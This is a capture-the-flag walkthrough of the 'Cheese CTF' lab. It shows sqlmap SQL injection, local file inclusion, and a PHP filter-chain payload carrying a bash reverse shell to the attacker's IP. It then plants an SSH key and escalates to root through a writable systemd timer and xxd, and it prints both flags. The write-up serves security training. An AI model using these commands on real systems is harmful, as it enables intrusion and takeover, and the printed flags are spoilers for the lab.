# Cheese CTF

## Challenge Information
- **Challenge Name**: Cheese CTF
- **Category**: Web Security & Privilege Escalation
- **Difficulty Level**: Easy

## Analysis

As a traditional pentesing method, I first tried with directory enumeration where I found nothing. Simultaneously, I ran nmap looking for any open ports which gave more than 100+ ports. Hence, there was no clue in both of these tests. So now i decided to move towards sqli, since there was a login page and we had to find the user flag first, it means that we had to login as a user. Anyhow, lets try sqli now.

Moving forward towards the SQLi, I ran the command: `sqlmap -u "http://<IP_ADDRESS>/login.php" --data="username=test&password=test" --batch --dump`
Command Breakdown:
-> `sqlmap` : The tool being used, which automates the process of detecting and exploiting SQL injection vulnerabilities.
-> `-u "http://<IP_ADDRESS>/login.php"` : Specifies the target URL where the SQL injection will be tested.
-> `--data="username=test&password=test"` : Specifies the POST data being sent to the server. This simulates a login attempt with the username set to test and password set to test.
-> `--batch` : Runs the command in non-interactive mode. It automatically answers any prompts that sqlmap might generate, using the default or safest options. This is useful for automation or unattended testing.
-> `--dump` : Instructs sqlmap to dump the database contents if it successfully exploits the SQL injection vulnerability. This means it will retrieve and display the data stored in the database.

The detailed analysis on running this command is as follows:
SQLMap tested the username parameter and detected that it is vulnerable to time-based blind SQL injection. The backend database management system (DBMS) was identified as MySQL (MariaDB fork). The current database was retrieved (users). SQLMap found one table named users in the users database. Columns in the users table were identified as `id`, `username`, `password`. The single entry in the users table was retrieved as `ID: 1, Username: comte, Password Hash: 5b0c2e1b4fe1410e47f26feff7f4fc4c`. SQLMap recognized the password hash as MD5. It used its default dictionary for a dictionary-based attack but failed to crack the hash.
Moreover, it also gave a 302 redirect to `http://<IP_ADDRESS>/secret-script.php?file=supersecretadminpanel.html`. The link suggests that it is loading a file from a directory without any check which might result in LFI. So lets test it with the url `http://<IP_ADDRESS>/secret-script.php?file=/etc/passwd`. This showed some content on the webpage. It means that we can exploit it through LFI. In the content that we got from `/etc/passwd`, there is something `comte:x:1000:1000:comte:/home/comte:/bin/bash`, which seggests that this account has a shell (/bin/bash) and may be your entry point to gain local access.

Now our next task is to upload a reverse shell on the server using the LFI. I tried uploading the shell by running a local server on my machine with a local port, but it did not worked. It means that there are some filters that are preventing me to upload any php shell. To bypass this, we have to use a script that generates different filter chains for the different payloads. I downloaded a script from github `https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py` that generates multiple chains while uploading the shell code. Make sure that you are running your port on netcat `nc -lvnp YOUR_PORT`. Now run the command `python3 php-reverse-shell.py --chain "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/<YOUR_PORT> 0>&1'\"); ?>" | grep "^php" > payload.txt`. It will generate a lot of useful payloads. Now run the command `curl "http://<IP_ADDRESS>/secret-script.php?file=$(cat payload.txt)"`. This will give you a reverse shell in the directory `/var/www/html` on the terminal where you are running the netcat.

1. To get the user's flag, we have to search in his directory `/home/comte` that we also discovered previously. We have a `user.txt` in `/home/comte` but it says permission denied if we try to read it using cat command. So we need previlage escaltion now. For this, download `linpeas.sh` using the command `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`. Now run a python server `python3 -m http.server 8000 --bind <YOUR_VPN_IP>`. Now run `wget http://<YOUR_VPN_IP>:8000/linpeas.sh` in the target machine, but before running this, move to `cd /tmp` so that we are able to write in the target machine and also make sure that linpeas.sh is in the same directory where you are running the python server so that it gets copied to the target machine. Once the linpeas.sh is downloaded in the target machine, run `chmod +x linpeas.sh` to grant permissions to the file. Now execute it `./linpeas.sh`. The execution of this gave a long response, but it is very important for us to analyze its response. Deeply go through the response and you will observe some lines:
```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                     
/dev/mqueue                                                                                                                                                           
/dev/shm
/etc/systemd/system/exploit.timer
/home/comte/.ssh/authorized_keys
/run/lock
/run/lock/apache2
/run/screen
/snap/core20/2015/run/lock
/snap/core20/2015/tmp
/snap/core20/2015/var/tmp
/snap/core20/2182/run/lock
/snap/core20/2182/tmp
/snap/core20/2182/var/tmp
/tmp
/tmp/linpeas.sh
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
```
`/home/comte/.ssh/authorized_keys` suggests that there are some authorized ssh keys that allow to login as comte. So we will also add our own ssh key so that we can also login as comte. In your local machine, login as root `sudo su` and generate a ssh key `ssh-keygen -t rsa`. The key will be saved in the path `/root/.ssh/id_rsa.pub`. Copy the key `cat /root/.ssh/id_rsa.pub` using this and write it in the target machine: `echo "key" > /home/comte/.ssh/authorized_keys`. Now we will be loggin in as comte in our own local machine `ssh -i /root/.ssh/id_rsa comte@<IP_ADDRESS>`. Now `cat /home/comte/user.txt` will give us the flag `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`.

2. The root.txt file is present in the path `/root/root.txt`, but we do not have permission to read it. Remember the file for which we had write permissions (mentioned above) `/etc/systemd/system/exploit.timer`. We can use it to run an exploit service. Move to the directory `cd /etc/systemd/system/` where we logged in as comte. Check the file contents `cat /etc/systemd/system/exploit.timer` and it will give some contents like this:
```
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```
Modify the line `OnBootSec=5s` using the command `nano exploit.timer`. Now run the following commands in the local terminal where we logged in as comte: `sudo systemctl daemon-reload`, `sudo systemctl start exploit.timer`, `systemctl status exploit.timer`. This will run and also confirm whether the run was successful or not. We will be again using the same ssh key to get the previlage of the root as well. Look for any method to gain sudo privileges in `https://gtfobins.github.io/`. Here we came to know that we can use `xxd` for the exploitation. Navigate to the directory `/opt` because the exploit scenario assumes we have write permissions there. Run the command `echo "key" | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys"`. Now open another terminal in your local machine with `sudo su` and run the command `ssh -i /root/.ssh/id_rsa root@<IP_ADDRESS>`. This will login you as a root into Cheeze! Now just `cat /root/root.txt` and it will give the flag `THM{dca75486094810807faf4b7b0a929b11e5e0167c}`.
